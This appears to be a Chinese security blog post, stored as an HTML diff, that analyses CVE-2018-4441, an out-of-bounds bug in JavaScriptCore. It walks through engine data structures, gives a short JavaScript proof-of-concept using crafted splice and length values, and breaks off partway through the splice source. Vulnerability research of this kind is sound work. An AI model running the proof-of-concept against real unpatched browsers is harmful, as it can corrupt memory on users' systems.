@@ -1,0 +1,745 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="DingJiayu">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CVE-2018-4441基本结构JSCell1234567891011121314151617181920212223&#x2F;&#x2F;下面是JSCell构造函数，是利用structure来进行初始化其成员inline JSCell::JSCell(VM&amp;, Structure* structure)    : m_structureID(structure-&gt;id())    , m_inde">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JSC--OOB">
+<meta property="og:url" content="https://binpwn.github.io/2023/04/06/JSC--OOB/index.html">
+<meta property="og:site_name" content="binpwn&#39;s blog">
+<meta property="og:description" content="CVE-2018-4441基本结构JSCell1234567891011121314151617181920212223&#x2F;&#x2F;下面是JSCell构造函数，是利用structure来进行初始化其成员inline JSCell::JSCell(VM&amp;, Structure* structure)    : m_structureID(structure-&gt;id())    , m_inde">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://binpwn.github.io/2023/04/06/JSC--OOB/image-20240911204744829.png">
+<meta property="article:published_time" content="2023-04-06T13:36:57.000Z">
+<meta property="article:modified_time" content="2024-09-15T06:38:18.311Z">
+<meta property="article:author" content="DingJiayu">
+<meta property="article:tag" content="JSC">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://binpwn.github.io/2023/04/06/JSC--OOB/image-20240911204744829.png">
+  
+  
+  
+  <title>JSC--OOB - binpwn&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"binpwn.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>binpwn&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JSC--OOB"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-06 21:36" pubdate>
+          2023年4月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          30 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JSC--OOB</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CVE-2018-4441"><a href="#CVE-2018-4441" class="headerlink" title="CVE-2018-4441"></a>CVE-2018-4441</h1><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><h3 id="JSCell"><a href="#JSCell" class="headerlink" title="JSCell"></a>JSCell</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><br><span class="hljs-comment">//下面是JSCell构造函数，是利用structure来进行初始化其成员</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">JSCell::JSCell</span><span class="hljs-params">(VM&amp;, Structure* structure)</span></span><br><span class="hljs-function">    : m_structureID(structure-&gt;id())</span><br><span class="hljs-function">    , m_indexingTypeAndMisc(structure-&gt;indexingModeIncludingHistory())</span><br><span class="hljs-function">    , m_type(structure-&gt;typeInfo().type())</span><br><span class="hljs-function">    , m_flags(structure-&gt;typeInfo().inlineTypeFlags())</span><br><span class="hljs-function">    , m_cellState(CellState::DefinitelyWhite)</span><br><span class="hljs-function">&#123;</span><br>    <span class="hljs-built_in">ASSERT</span>(!<span class="hljs-built_in">isCompilationThread</span>());<br><br>    <span class="hljs-comment">// Note that in the constructor initializer list above, we are only using values</span><br>    <span class="hljs-comment">// inside structure but not necessarily the structure pointer itself. All these</span><br>    <span class="hljs-comment">// values are contained inside Structure::m_blob. Note also that this constructor</span><br>    <span class="hljs-comment">// is an inline function. Hence, the compiler may choose to pre-compute the address</span><br>    <span class="hljs-comment">// of structure-&gt;m_blob and discard the structure pointer itself. There&#x27;s a chance</span><br>    <span class="hljs-comment">// that the GC may run while allocating this cell. In the event that the structure</span><br>    <span class="hljs-comment">// is newly instantiated just before calling this constructor, there may not be any</span><br>    <span class="hljs-comment">// other references to it. As a result, the structure may get collected before this</span><br>    <span class="hljs-comment">// cell is even constructed. To avoid this possibility, we need to ensure that the</span><br>    <span class="hljs-comment">// structure pointer is still alive at this point.</span><br>    <span class="hljs-built_in">ensureStillAliveHere</span>(structure);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="ArrayStorage"><a href="#ArrayStorage" class="headerlink" title="ArrayStorage"></a>ArrayStorage</h3><p>下面讲到这是数组存储值的地方，下面列出了其部分类函数和成员，可以看到它和butterfly息息相关</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// This struct holds the actual data values of an array. A JSArray object points to its contained ArrayStorage</span><br><span class="hljs-comment">// struct by pointing to m_vector. To access the contained ArrayStorage struct, use the getStorage() and </span><br><span class="hljs-comment">// setStorage() methods. It is important to note that there may be space before the ArrayStorage that </span><br><span class="hljs-comment">// is used to quick unshift / shift operation. The actual allocated pointer is available by using:</span><br><span class="hljs-comment">//     getStorage() - m_indexBias * sizeof(JSValue)</span><br><span class="hljs-comment">// All slots in ArrayStorage (slots from 0 to vectorLength) are expected to be initialized to a JSValue or,</span><br><span class="hljs-comment">// for hole slots, JSValue().</span><br>    <span class="hljs-function"><span class="hljs-type">static</span> ArrayStorage* <span class="hljs-title">from</span><span class="hljs-params">(Butterfly* butterfly)</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast_ptr</span>&lt;ArrayStorage*&gt;(butterfly); &#125;<br>    <span class="hljs-function"><span class="hljs-type">static</span> ArrayStorage* <span class="hljs-title">from</span><span class="hljs-params">(IndexingHeader* indexingHeader)</span> </span>&#123; <span class="hljs-keyword">return</span> indexingHeader-&gt;<span class="hljs-built_in">arrayStorage</span>(); &#125;<br>    <span class="hljs-function">Butterfly* <span class="hljs-title">butterfly</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;Butterfly*&gt;(<span class="hljs-keyword">this</span>); &#125;<br><br>    WriteBarrier&lt;SparseArrayValueMap&gt; m_sparseMap;<br>    <span class="hljs-type">unsigned</span> m_indexBias;<br>    <span class="hljs-type">unsigned</span> m_numValuesInVector;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE(JSVALUE32_64)</span><br>    <span class="hljs-type">uintptr_t</span> m_padding;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    WriteBarrier&lt;Unknown&gt; m_vector[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure>
+
+<p>Butterfly</p>
+<p>下面是Butterfly的部分成员函数，也可以看到Butterfly和ArrayStorage相互转换</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;</span><br><span class="hljs-function">T* <span class="hljs-title">indexingPayload</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast_ptr</span>&lt;T*&gt;(<span class="hljs-keyword">this</span>); &#125;<br><span class="hljs-function">ArrayStorage* <span class="hljs-title">arrayStorage</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">indexingPayload</span>&lt;ArrayStorage&gt;(); &#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><p>下面是JSObject的构造函数和其成员</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">JSObject::JSObject</span><span class="hljs-params">(VM&amp; vm, Structure* structure, Butterfly* butterfly)</span></span><br><span class="hljs-function">    : JSCell(vm, structure)</span><br><span class="hljs-function">    , m_butterfly(vm, this, butterfly)</span><br><span class="hljs-function">&#123;</span><br>&#125;<br><span class="hljs-comment">// 下面是其成员</span><br>    AuxiliaryBarrier&lt;Butterfly*&gt; m_butterfly;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> CPU(ADDRESS32)</span><br>    <span class="hljs-type">unsigned</span> m_32BitPadding;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">// 下面是JSNonFinalObject的构造函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">JSNonFinalObject</span><span class="hljs-params">(VM&amp; vm, Structure* structure, Butterfly* butterfly = <span class="hljs-literal">nullptr</span>)</span></span><br><span class="hljs-function">        : JSObject(vm, structure, butterfly)</span><br><span class="hljs-function">    &#123;</span><br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><p>下面是JSArray的构造函数和相关创建函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">JSArray</span><span class="hljs-params">(VM&amp; vm, Structure* structure, Butterfly* butterfly)</span></span><br><span class="hljs-function">    : JSNonFinalObject(vm, structure, butterfly)</span><br><span class="hljs-function">&#123;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">inline</span> Butterfly* <span class="hljs-title">tryCreateArrayButterfly</span><span class="hljs-params">(VM&amp; vm, JSObject* intendedOwner, <span class="hljs-type">unsigned</span> initialLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    Butterfly* butterfly = Butterfly::<span class="hljs-built_in">tryCreate</span>(<br>        vm, intendedOwner, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>, <span class="hljs-built_in">baseIndexingHeaderForArrayStorage</span>(initialLength),<br>        ArrayStorage::<span class="hljs-built_in">sizeFor</span>(BASE_ARRAY_STORAGE_VECTOR_LEN));<br>    <span class="hljs-keyword">if</span> (!butterfly)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    ArrayStorage* storage = butterfly-&gt;<span class="hljs-built_in">arrayStorage</span>();<br>    storage-&gt;m_sparseMap.<span class="hljs-built_in">clear</span>();<br>    storage-&gt;m_indexBias = <span class="hljs-number">0</span>;<br>    storage-&gt;m_numValuesInVector = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> butterfly;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> JSArray* <span class="hljs-title">JSArray::tryCreate</span><span class="hljs-params">(VM&amp; vm, Structure* structure, <span class="hljs-type">unsigned</span> initialLength, <span class="hljs-type">unsigned</span> vectorLengthHint)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">ASSERT</span>(vectorLengthHint &gt;= initialLength);<br>    <span class="hljs-type">unsigned</span> outOfLineStorage = structure-&gt;<span class="hljs-built_in">outOfLineCapacity</span>();<br><br>    Butterfly* butterfly;<br>    IndexingType indexingType = structure-&gt;<span class="hljs-built_in">indexingType</span>();<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">LIKELY</span>(!<span class="hljs-built_in">hasAnyArrayStorage</span>(indexingType))) &#123;<br>        <span class="hljs-built_in">ASSERT</span>(<br>            <span class="hljs-built_in">hasUndecided</span>(indexingType)<br>            || <span class="hljs-built_in">hasInt32</span>(indexingType)<br>            || <span class="hljs-built_in">hasDouble</span>(indexingType)<br>            || <span class="hljs-built_in">hasContiguous</span>(indexingType));<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(vectorLengthHint &gt; MAX_STORAGE_VECTOR_LENGTH))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br><br>        <span class="hljs-type">unsigned</span> vectorLength = Butterfly::<span class="hljs-built_in">optimalContiguousVectorLength</span>(structure, vectorLengthHint);<br>        <span class="hljs-type">void</span>* temp = vm.jsValueGigacageAuxiliarySpace.<span class="hljs-built_in">allocateNonVirtual</span>(<br>            vm,<br>            Butterfly::<span class="hljs-built_in">totalSize</span>(<span class="hljs-number">0</span>, outOfLineStorage, <span class="hljs-literal">true</span>, vectorLength * <span class="hljs-built_in">sizeof</span>(EncodedJSValue)),<br>            <span class="hljs-literal">nullptr</span>, AllocationFailureMode::ReturnNull);<br>        <span class="hljs-keyword">if</span> (!temp)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        butterfly = Butterfly::<span class="hljs-built_in">fromBase</span>(temp, <span class="hljs-number">0</span>, outOfLineStorage);<br>        butterfly-&gt;<span class="hljs-built_in">setVectorLength</span>(vectorLength);<br>        butterfly-&gt;<span class="hljs-built_in">setPublicLength</span>(initialLength);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">hasDouble</span>(indexingType))<br>            <span class="hljs-built_in">clearArray</span>(butterfly-&gt;<span class="hljs-built_in">contiguousDouble</span>().<span class="hljs-built_in">data</span>(), vectorLength);<br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">clearArray</span>(butterfly-&gt;<span class="hljs-built_in">contiguous</span>().<span class="hljs-built_in">data</span>(), vectorLength);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">ASSERT</span>(<br>            indexingType == ArrayWithSlowPutArrayStorage<br>            || indexingType == ArrayWithArrayStorage);<br>        butterfly = <span class="hljs-built_in">tryCreateArrayButterfly</span>(vm, <span class="hljs-literal">nullptr</span>, initialLength);<br>        <span class="hljs-keyword">if</span> (!butterfly)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; BASE_ARRAY_STORAGE_VECTOR_LEN; ++i)<br>            butterfly-&gt;<span class="hljs-built_in">arrayStorage</span>()-&gt;m_vector[i].<span class="hljs-built_in">clear</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">createWithButterfly</span>(vm, <span class="hljs-literal">nullptr</span>, structure, butterfly);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1</span>];<br><br>    arr.<span class="hljs-property">length</span> = <span class="hljs-number">0x100000</span>;<br>    arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0x11</span>);<br><br>    arr.<span class="hljs-property">length</span> = <span class="hljs-number">0xfffffff0</span>;<br>    arr.<span class="hljs-title function_">splice</span>(<span class="hljs-number">0xfffffff0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-title function_">main</span>();<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="splice函数"><a href="#splice函数" class="headerlink" title="splice函数"></a>splice函数</h2><p>上面<code>JavaScript</code>中用到的<code>splice</code>函数在<code>JSC</code>中对应<code>arrayProtoFunSplice</code>函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">JSC_NATIVE_FUNCTION_WITHOUT_TRANSITION</span>(<span class="hljs-string">&quot;splice&quot;</span>, arrayProtoFuncSplice, <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">unsigned</span>&gt;(PropertyAttribute::DontEnum), <span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="arrayProtoFunSplice"><a href="#arrayProtoFunSplice" class="headerlink" title="arrayProtoFunSplice"></a>arrayProtoFunSplice</h2><p>下面第90行根据删除元素的数量和增加的数量相比来决定使用<code>shift</code>还是<code>unshift</code></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-built_in">JSC_DEFINE_HOST_FUNCTION</span>(arrayProtoFuncSplice, (JSGlobalObject* globalObject, CallFrame* callFrame))<br>&#123;<br>    <span class="hljs-comment">// 15.4.4.12</span><br><br>    VM&amp; vm = globalObject-&gt;<span class="hljs-built_in">vm</span>();<br>    <span class="hljs-keyword">auto</span> scope = <span class="hljs-built_in">DECLARE_THROW_SCOPE</span>(vm);<br><br>    JSObject* thisObj = callFrame-&gt;<span class="hljs-built_in">thisValue</span>().<span class="hljs-built_in">toThis</span>(globalObject, ECMAMode::<span class="hljs-built_in">strict</span>()).<span class="hljs-built_in">toObject</span>(globalObject);<br>    <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!!scope.<span class="hljs-built_in">exception</span>() == !thisObj);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(!thisObj))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br>    <span class="hljs-type">uint64_t</span> length = <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">uint64_t</span>&gt;(<span class="hljs-built_in">toLength</span>(globalObject, thisObj));<br>    <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br><br>    <span class="hljs-keyword">if</span> (!callFrame-&gt;<span class="hljs-built_in">argumentCount</span>()) &#123;<br>        std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult = <span class="hljs-built_in">speciesConstructArray</span>(globalObject, thisObj, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">EXCEPTION_ASSERT</span>(!!scope.<span class="hljs-built_in">exception</span>() == (speciesResult.first == SpeciesConstructResult::Exception));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">UNLIKELY</span>(speciesResult.first == SpeciesConstructResult::Exception))<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">encodedJSValue</span>();<br><br>        JSObject* result;<br>        <span class="hljs-keyword">if</span> (speciesResult.first == SpeciesConstructResult::CreatedObject)<br>            result = speciesResult.second;<br>        <span class="hljs-keyword">else</span> &#123;<br>            result = <span class="hljs-built_in">constructEmptyArray</span>(globalObject, <span class="hljs-literal">nullptr</span>);<br>            <span class="hljs-built_in">RETURN_IF_EXCEPTION</span>(scope, <span class="hljs-built_in">encodedJSValue</span>());<br>        &#125;<br><br>        <span class="hljs-built_in">setLength</span>(globalObject, vm, result, <span 